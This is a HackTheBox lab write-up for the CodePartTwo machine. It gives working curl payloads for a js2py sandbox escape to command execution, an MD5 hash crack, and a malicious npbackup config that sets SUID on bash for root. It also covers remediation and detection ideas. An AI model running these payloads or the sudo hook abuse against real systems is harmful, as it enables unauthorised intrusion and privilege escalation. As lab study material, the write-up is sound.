---
layout: default
title: "HackTheBox - CodePartTwo"
---

# HackTheBox - CodePartTwo

**OS:** Linux (Ubuntu 20.04)

CodePartTwo is a Linux machine built around a Flask web application that exposes an
unauthenticated JavaScript code-execution endpoint backed by **js2py 0.74**. The sandbox
calls `js2py.disable_pyimport()`, which only blocks the JS-facing `pyimport` function and
leaves the Python object hierarchy fully traversable. The escape walks the Python MRO chain
to reach `subprocess.Popen` and gains OS command execution as the `app` service account.
The live SQLite database holds an MD5-hashed credential for user `marco`; cracking it gives
SSH access. Marco may run the npbackup backup client as root via `sudo` with no password and
may supply an arbitrary config file, which supports pre-execution hooks. Injecting
`chmod u+s /bin/bash` via a crafted config drops a root shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (codeparttwo) |
| Initial Access | js2py sandbox escape via Python MRO subclass chain -> `subprocess.Popen` RCE as `app` |
| Lateral Movement | SQLite MD5 hash crack -> SSH as `marco` |
| Privilege Escalation | `sudo /usr/local/bin/npbackup-cli -c <evil-config>` pre_exec_commands hook |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP scan found two open ports: SSH on 22 and a web application on 8000.

```
$ nmap -p- --min-rate 5000 -T4 <target-ip>
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

Service fingerprinting identified Gunicorn serving the Flask app.

```
$ nmap -sCV -p22,8000 <target-ip>
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: CodePartTwo
```

### Web Application

Port 8000 serves a "CodePartTwo" Flask application with user registration, login, and a
JavaScript code editor. The dashboard lets any logged-in user write and run JavaScript snippets
via a `/run_code` POST endpoint.

The `/download` endpoint serves an `app.zip` containing the application source. Examining the
source immediately reveals the attack surface:

```python
# app.py (extracted from /download)
import js2py
js2py.disable_pyimport()
app.secret_key = 'S3cr3tK3yC0d3PartTw0'

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

Three things stand out: (1) `/run_code` has no authentication check, (2) `js2py.eval_js`
runs arbitrary JavaScript in a Python-backed sandbox, (3) `disable_pyimport()` is the only
sandbox control, blocking the JS-facing `pyimport` function, not Python object traversal.

> **Why this works:** `js2py.eval_js` translates JavaScript to Python at runtime. The sandbox
> only disables the explicit `pyimport` hook; the entire Python type hierarchy is still
> reachable by walking JavaScript property access chains down to raw Python objects.

---

## Initial Access

### js2py Sandbox Analysis

Before mounting the escape it helps to understand js2py's object wrapping model. Python values
exposed to JavaScript are either wrapped in a `PyJs` type (losing Python attribute access) or
left as raw Python objects accessible via `PyObjectWrapper`, which falls back to Python's
`getattr`. The key rules:

- **Primitive types and standard callables** (str, int, dict, list, FunctionType, BuiltinMethodType...)
  are converted by `HJs()` into proper PyJs objects. A Python dict becomes a `PyJsObject` with
  JavaScript key-lookup; a Python function becomes a `PyWrapper` callable that auto-converts
  arguments via `to_python()`.
- **Everything else** (Python class objects, custom types like `dict_keys`, `MappingProxyType`...)
  is left as a raw `PyObjectWrapper`, and `PyObjectWrapper.get(prop)` calls `getattr(self.obj, prop)`,
  giving full Python attribute access.

The entry point is `Object.getOwnPropertyNames(Function)`, which returns the internal
`dict_keys` set of Function's own properties. `dict_keys` is NOT a standard Python type, so
js2py wraps it as a `PyObjectWrapper`, and Python `getattr` works on it. From `dict_keys` we
can reach the class hierarchy:

```
dict_keys.__class__          -> Python `type`
dict_keys.__class__.__mro__  -> (type, object)
dict_keys.__class__.__mro__[1]  -> object
object.__subclasses__()      -> list of 847+ subclasses loaded in this process
```

### Finding Exploit Targets in the Subclass List

Run a server-side JS loop to identify useful subclasses by module name:

```
$ curl -s -X POST http://<target-ip>:8000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code": "var subs = Object.getOwnPropertyNames(Function).__class__.__mro__[1].__subclasses__(); var found = []; for (var i = 0; i < subs.length; i++) { var mod = subs[i].__module__; if (mod === '\''os'\'' || mod === '\''subprocess'\'' || mod === '\''warnings'\'') { found.push(i + '\'':'\'' + mod + '\''.'\''+subs[i].__name__); }} found.join('\''|'\'')"}'

{"result":"132:os._wrap_close|138:warnings.WarningMessage|139:warnings.catch_warnings|316:subprocess.CompletedProcess|317:subprocess.Popen"}
```

`subprocess.Popen` at index 317 is the direct path to command execution.

### The Subprocess.Popen RCE Chain

Calling a Python class object directly from JavaScript fails (the class is type `"object"` in
JS, not `"function"`). However, Python class objects expose `__new__` and `__init__` via
`getattr`, which js2py wraps as callable `PyWrapper` functions. The `PyWrapper` wrapping
automatically converts JavaScript argument types to Python equivalents via `to_python()`,
meaning a JavaScript string `'id'` becomes a Python `str 'id'` before it reaches
`subprocess.Popen.__init__`.

Two-step instantiation:

1. `Popen.__new__(Popen)` -- creates an empty Popen instance without running `__init__`
2. `Popen.__init__(instance, 'cmd', bufsize, executable, stdin, stdout, stderr, preexec_fn, close_fds, shell)` -- starts the process

`subprocess.PIPE` is the constant `-1`, which passes cleanly as a JavaScript number.

```
$ curl -s -X POST http://<target-ip>:8000/run_code \
  -H 'Content-Type: application/json' \
  -d '{
    "code": "var subs = Object.getOwnPropertyNames(Function).__class__.__mro__[1].__subclasses__(); var P = subs[317]; var inst = P.__new__(P); P.__init__(inst, '\''id'\'', -1, null, null, -1, null, null, true, true); inst.communicate()[0].decode('\''utf-8'\'')"
  }'

{"result":"uid=1001(app) gid=1001(app) groups=1001(app)\n"}
```

RCE confirmed as `app`. The endpoint is unauthenticated; no session cookie is required.

### Enumerating the Database

With command execution, read the live SQLite database to extract user credentials:

```
$ curl -s -X POST http://<target-ip>:8000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code": "var subs = Object.getOwnPropertyNames(Function).__class__.__mro__[1].__subclasses__(); var P = subs[317]; var inst = P.__new__(P); P.__init__(inst, '\''sqlite3 /home/app/app/instance/users.db \\\"select * from user\\\"'\'', -1, null, null, -1, null, null, true, true); inst.communicate()[0].decode('\''utf-8'\'')"}'

{"result":"1|marco|649c9d65a206a75f5abe509fe128bce5\n2|app|a97588c0e2fa3a024876339e27aeb42e\n"}
```

The application hashes passwords with MD5: `hashlib.md5(password.encode()).hexdigest()`.

> **Why this matters:** The downloaded `app.zip` is a static placeholder with an older version
> of the application. The actual live database is at `/home/app/app/instance/users.db`. The
> hardcoded `app.secret_key` in the downloaded source does NOT match the live server's key,
> so session forgery does not work. The database read is the correct path.

---

## Lateral Movement

### Cracking Marco's MD5 Hash

```
$ echo "marco:649c9d65a206a75f5abe509fe128bce5" > marco_hash.txt
$ john --format=raw-md5 --wordlist=/path/to/rockyou.txt marco_hash.txt
sweetangelbabylove   (marco)
```

> **Why this works:** MD5 is a fast, unsalted hash function. The per-password computation time
> is negligible; rockyou.txt exhausts in seconds on modern hardware.

### SSH as Marco

```
$ ssh marco@<target-ip>
marco@<target-ip>'s password: sw********************e

marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)

marco@codeparttwo:~$ cat ~/user.txt
<user-flag-redacted>
```

---

## Privilege Escalation

### Sudo Enumeration

```
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:...

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Marco can run `npbackup-cli` as root with no password and can pass an arbitrary config file
via `-c`.

### Inspecting npbackup-cli

`npbackup-cli` is a Python-based backup client. The configuration file format (YAML) supports
`pre_exec_commands` and `post_exec_commands` arrays under each backup group. These hooks run
as the invoking user before or after the backup operation, regardless of whether the backup
itself succeeds.

The existing `~/npbackup.conf` config confirms the hooks are present but empty:

```yaml
groups:
  default_group:
    backup_opts:
      pre_exec_commands: []
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
```

> **Why this works:** `pre_exec_failure_is_fatal: false` means even if the command fails the
> backup continues, but crucially the command still runs. With `sudo` executing the binary as
> root, any command placed in `pre_exec_commands` runs as root.

### Crafting the Malicious Config

Write a minimal config with a pre-exec hook that sets the SUID bit on `/bin/bash`:

```
marco@codeparttwo:~$ cat > /tmp/evil.conf << 'EOF'
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: /tmp/fakebackup
    repo_group: default_group
    backup_opts:
      paths:
      - /tmp
      source_type: folder_list
    repo_opts:
      repo_password: placeholder
groups:
  default_group:
    backup_opts:
      paths: []
      pre_exec_commands:
      - chmod u+s /bin/bash
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
    repo_opts:
      repo_password: placeholder
      minimum_backup_age: 0
    prometheus: {}
    env: {}
    is_protected: false
global_prometheus:
  metrics: false
EOF
```

### Triggering the Exploit

```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/evil.conf -b -f
2026-06-26 ... INFO :: npbackup 3.0.1 ... running as root
2026-06-26 ... INFO :: Running backup of ['/tmp'] to repo default
2026-06-26 ... INFO :: Pre-execution of command chmod u+s /bin/bash succeeded with:
None
...

marco@codeparttwo:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

### Root Shell

```
marco@codeparttwo:~$ /bin/bash -p

bash-5.0# id
uid=1000(marco) gid=1000(marco) euid=0(root) groups=1000(marco),1003(backups)

bash-5.0# cat /root/root.txt
<root-flag-redacted>
```

---

## Root Cause

Two vulnerabilities chained with a credential weakness:

1. **Unauthenticated js2py sandbox escape** (`/run_code`): the endpoint has no access control
   and `disable_pyimport()` is insufficient as the only sandbox boundary. Python's object model
   is fully traversable from JavaScript via `PyObjectWrapper` fallback; an attacker can reach
   any Python class instantiated in the process.
2. **MD5 password hashing**: unsalted MD5 is trivially reversed with a GPU or wordlist. Any
   modern application should use bcrypt, scrypt, or argon2.
3. **sudo rule grants unrestricted config-file path**: `sudo npbackup-cli` with no restriction
   on `-c` lets an operator substitute an attacker-controlled YAML file. The pre/post exec hooks
   become root-level command execution.

---

## Impact

An unauthenticated attacker on the network can achieve OS command execution as the application
service account, read the live credential database, crack the weak MD5 hash to gain SSH access,
and escalate to root in minutes. Full system compromise is trivially repeatable.

---

## Remediation

1. **Add authentication to `/run_code`** (breaks the initial access path): require a valid
   session before accepting code for execution. The endpoint is currently open to anyone.
2. **Replace js2py with a proper JavaScript sandbox or a locked-down interpreter** if server-side
   JS evaluation is genuinely needed. If not, remove the feature entirely.
3. **Replace MD5 with a modern password hashing algorithm** (bcrypt, scrypt, or argon2 with
   appropriate work factors). All existing MD5 hashes should be invalidated and users forced to
   reset passwords.
4. **Restrict the sudo rule** to prevent arbitrary config-file injection: either whitelist a
   specific config path (`NOPASSWD: /usr/local/bin/npbackup-cli -c /etc/npbackup/npbackup.conf`)
   or run npbackup-cli under a dedicated low-privilege service account that can only write to its
   own backup destination, removing the need for the sudo rule.
5. **Remove the `/download` endpoint** or restrict access: exposing application source code
   allows attackers to audit logic, discover key material, and plan precise attacks.

### Validation

- `/run_code` endpoint: confirm a 401 or redirect is returned for unauthenticated requests.
- Password hashing: confirm `hashlib.md5` no longer appears in application code; user table
  hashes should be bcrypt/scrypt/argon2 format.
- Sudo rule: `sudo -l` as `marco` should show no entry for `npbackup-cli`, or a restricted
  entry pinning the config path.

---

## Detection Opportunities

- **Web: unauthenticated POST to `/run_code`**: alert on requests lacking session cookies,
  especially with payloads referencing `__class__`, `__mro__`, `__subclasses__`, or `Popen`.
- **Process creation from gunicorn workers**: a gunicorn PID spawning `/bin/sh` or `id` is
  anomalous; monitor for unexpected child processes of the Python/gunicorn process tree.
- **SQLite file access from web worker**: the gunicorn process reading `/home/app/app/instance/users.db`
  via `sqlite3` shell rather than the ORM is a lateral-exfil signal.
- **SUID change on system binaries**: `auditd` rule on `chmod` calls targeting `/bin/bash` or
  `/usr/bin/python*`; or integrity monitoring (AIDE/Tripwire) on SUID binary set.
- **sudo npbackup-cli with non-standard -c path**: log `sudo` invocations; flag any call to
  `npbackup-cli` with a `-c` argument pointing outside `/etc/` or `/home/marco/`.

---

## Lessons Learned

- `js2py.disable_pyimport()` is not a sandbox. It blocks one hook while leaving the full Python
  object hierarchy navigable. Treating it as a security boundary is a false assumption.
- The `PyObjectWrapper` fallback in js2py exposes Python `getattr` for any type not in the
  primitive-type list. Subclasses of `object` are raw Python objects that retain full attribute
  access, including `__new__` and `__init__` with auto-converting arguments via `to_python()`.
- Sudo rules that accept user-controlled arguments (config paths, filenames) are almost always
  exploitable. The correct model is to either hard-code the config in the sudo rule or run the
  service as a dedicated account without root.

---

## Cleanup

Steps taken after flags were captured:

- Removed the SUID bit: `chmod u-s /bin/bash` (confirmed with `ls -la`)
- Removed `/tmp/evil.conf` and `/tmp/fakebackup` restic repository
- Removed `/home/app/.ssh/authorized_keys` (SSH key written for initial app foothold)
- Closed SSH sessions; no persistent shells, listeners, or cron jobs left
- No AD objects or system config modifications to revert
